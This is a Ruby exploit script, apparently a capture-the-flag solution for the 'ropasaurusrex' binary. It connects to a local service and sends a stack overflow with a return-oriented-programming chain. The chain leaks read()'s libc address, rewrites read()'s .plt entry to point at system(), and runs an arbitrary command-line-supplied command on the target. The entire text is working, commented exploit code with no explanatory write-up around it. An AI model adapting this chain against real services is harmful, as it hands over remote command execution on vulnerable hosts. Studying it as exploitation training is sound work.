 require 'socket'
  
  s = TCPSocket.new("localhost", 4444)
  
  # The command we'll run
  cmd = ARGV[0] + "\0"
  
  # From objdump -x
  buf = 0x08049530
 
 # From objdump -D ./ropasaurusrex | grep read
 read_addr = 0x0804832C
 # From objdump -D ./ropasaurusrex | grep write
 write_addr = 0x0804830C
 # From gdb, "x/x system"
 system_addr = 0xb7ec2450
 # Fram objdump, "pop/pop/pop/ret"
 pppr_addr = 0x080484b6
 
 # The location where read()'s .plt entry is
 read_addr_ptr = 0x0804961c
 
 # The difference between read() and system()
 # Calculated as  read (0xb7f48110) - system (0xb7ec2450)
 # Note: This is the one number that needs to be calculated using the
 # target version of libc rather than my own!
 read_system_diff = 0x85cc0
 
 # Generate the payload
 payload = "A"*140 +
   [
     # system()'s stack frame
     buf,         # writable memory (cmd buf)
     0x44444444,  # system()'s return address
 
     # pop/pop/pop/ret's stack frame
     # Note that this calls read_addr, which is overwritten by a pointer
     # to system() in the previous stack frame
     read_addr,   # (this will become system())
 
     # second read()'s stack frame
     # This reads the address of system() from the socket and overwrites
     # read()'s .plt entry with it, so calls to read() end up going to
     # system()
     4,           # length of an address
     read_addr_ptr, # address of read()'s .plt entry
     0,           # stdin
     pppr_addr,   # read()'s return address
 
     # pop/pop/pop/ret's stack frame
     read_addr,
 
     # write()'s stack frame
     # This frame gets the address of the read() function from the .plt
     # entry and writes to to stdout
     4,           # length of an address
     read_addr_ptr, # address of read()'s .plt entry
     1,           # stdout
     pppr_addr,   # retrurn address
 
     # pop/pop/pop/ret's stack frame
     write_addr,
 
     # read()'s stack frame
     # This reads the command we want to run from the socket and puts it
     # in our writable "buf"
     cmd.length,  # number of bytes
     buf,         # writable memory (cmd buf)
     0,           # stdin
     pppr_addr,   # read()'s return address
 
     read_addr # Overwrite the original return
   ].reverse.pack("I*") # Convert a series of 'ints' to a string
 
 # Write the 'exploit' payload
 s.write(payload)
 
 # When our payload calls read() the first time, this is read
 s.write(cmd)
 
 # Get the result of the first read() call, which is the actual address of read
 this_read_addr = s.read(4).unpack("I").first
 
 # Calculate the address of system()
 this_system_addr = this_read_addr - read_system_diff
 
 # Write the address back, where it'll be read() into the correct place by
 # the second read() call
 s.write([this_system_addr].pack("I"))
 
 # Finally, read the result of the actual command
 puts(s.read())
 
 # Clean up
 s.close()